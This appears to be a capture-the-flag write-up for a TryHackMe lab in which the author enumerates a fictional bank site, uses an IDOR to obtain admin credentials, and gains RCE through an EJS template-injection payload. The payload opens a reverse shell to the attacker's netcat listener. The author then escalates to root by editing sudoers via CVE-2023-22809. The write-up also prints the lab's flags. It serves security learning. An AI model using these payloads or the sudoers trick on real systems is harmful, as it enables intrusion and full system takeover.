# Whiterose Write-up

We are given some information about the target. The ip address and possible some login info Olivia Cortez:olivi8

With an initial nmap scan we find two services running

#### $nmap -sC -sV -v {ip_address}

1. SSH on port 22
2. HTTP on port 80

With the original given information, we can try to SSH into the machine but basic guesses don't reveal anything.

Going to the HTTP page brings us a page that can't be resolved, however, adding it to the /etc/hosts file gives us a webpage that doesn't 
give any information beyond that it's currently undergoing maintenance. Using gobuster doesn't reveal anything, so we pivot to ffuf for some domain enumeration.

#### wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u http://cyprusbank.thm/ -H 'HOST: FUZZ.cyprusbank.thm' --hc 400,404 -c

Immediately we are given admin.cyprusbank.thm which we add to hosts file. Working through the different pages, we find a page to login using the Olivia credentials given to us. Given the two tables, Tyrell Wellick's phone number isn't available.

Working through the different pages we come across the messages page with an interesting url

#### admin.cyprusbank.thm/messages/?c=5

A url with a value using a direct reference like this is know as IDOR or Insecure Direct Object Reference. By changing the value of c to 0, we get access to messages detailing admin login information.

#### Username: Gayle Bev
#### Password: p~]P@5!6;rs558:q

After gaining admin access and navigating back to the home page, the answer to the question of Tyrell Wellick phone number is there.

#### 842-029-5701

Moving onto the settings page, which wasn't available before. By testing with some dummy data the page returns a password updated alert after submitting.
Playing around with this doesn't yield anything as it can't seem to force the system to update a password to any specific accounts we could then login with.

Using burpsuite, more options are possible to delve deeper into the system. Capturing a request and deleting the password file generates:
#### ReferenceError: /home/web/app/views/settings.ejs
Googling for an embedded JavaScript exploit gives an Remote Code Execution (RCE) exploit using Server-Side Template Injection (SSTI).

Using an exploit found here https://github.com/mde/ejs/issues/735

After starting a nc listener on our local machine we start listening to catch the shell from our exploit

#### nc -lvnp 4444

We can deliver the payload 

#### &settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('busybox nc {local_ip} 4444 -e /bin/bash');

After catching our reverse shell we stabilize it with:

#### python3 -c 'import pty;pty.spawn("/bin/bash")'
Then on host machine
#### ctrl+Z
#### stty raw -echo; fg

Type reset, press enter, ctrl+c which gives a responsive shell.

Looking around gives the answer to the second question of the user.txt flag.

#### THM{4lways_upd4te_uR_d3p3nd3nc!3s}

Starting by checking for any possible sudo commands, we have the ability to run sudoedit.

Using CVE-2023-22809, add an editor variable with

#### export EDITOR="nano -- /etc/sudoers"

#### sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

Adding the exploit in to User privilege escalation.

### web ALL=(ALL:ALL) NOPASSWD: ALL

Finding the root.txt flag is as simple as 

#### sudo bash

and opening the root.txt final giving the final flag

#### THM{4nd_uR_p4ck4g3s}








